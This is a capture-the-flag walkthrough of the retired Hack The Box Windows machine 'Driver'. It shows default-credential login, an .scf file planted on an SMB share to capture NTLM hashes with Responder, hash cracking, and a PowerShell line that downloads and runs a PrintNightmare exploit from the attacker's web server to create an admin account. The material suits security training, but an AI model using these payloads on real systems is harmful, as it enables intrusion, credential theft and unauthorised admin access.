Driver is a retired Windows machine rated Easy on the HacktheBox platform. It can be found [here.](https://app.hackthebox.com/machines/Driver)

<h2> Enumeration</h2>
**Nmap scan results:**

```
80/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)   
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

<h2>Foothold</h2>

We navigate to the website running on port 80 and get a request for credentials. I attempt the first one in mind `admin:admin` and we seem to be let right in. From here we see:

The only navigation bar links that work seem to be "Home" and "Firmware Updates". Navigating to the latter we see:

<img src="/assets/images/Driver/drv1.PNG" alt="We can upload?">

I upload a reverse php shell file but can't navigate to any file directories (It's windows...). I re-read the explanation of the service again `upload the respective firmware update to our file share`. I see. It gets uploaded to a SMB file share. so a quick [google](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) informs me that use of files with the extension `.scf` can be used to execute certain commands. 

>*It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.*

We're instructed that we can use create a file with the following contents:

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
We do this and then start up [responder](https://www.oreilly.com/library/view/mastering-kali-linux/9781787120235/080d49cf-9726-4bbc-ad96-49ef7cbe0729.xhtml) and upload our `@evil.scf` file.

We receive the NTLM hash for the user who checks our `.scf` file which is pointing at our machine and picked up by our listening responder.

From here we save it into a file and use hashcat to crack it.

We see the user's credentials are "TONY:liltony". As port 5985 is open we can use `evil-winrm` to connect over winrm with these credentials.

<h2>Privilege Escalation</h2>

From here, we explore the idea that this box could be print nightmare related. The printer management on port 80 gives a big hint. We see that the print Spooler service is running which means we should try the exploit.

<img src="/assets/images/Driver/drv5.PNG" alt="liltony"> 

Grabbing the exploit from [Caleb Stewart | John Hammond](https://github.com/JohnHammond/CVE-2021-34527) we run our classic python webserver and then use powershell on target to download the file with: 

```
iex(new-object net.webclient).downloadstring('http://10.10.14.9/nightmare.ps1')
```

From here we use the `Invoke-Nightmare` command to generate an admin account:

```
Invoke-Nightmare -NewUser "vanitas" -NewPassword "password"
```

We sign-in as the user we just created and check our group membership.

<img src="/assets/images/Driver/drv7.PNG" alt="vanitas"> 

We have local admin and we can check the usual place for the root flag:

<img src="/assets/images/Driver/drv8.PNG" alt="Flag"> 

We also go back for the user flag we forgot:

<h4>For next time:</h4>

- Gotta remember the `.scf` SMB fileshare trick.
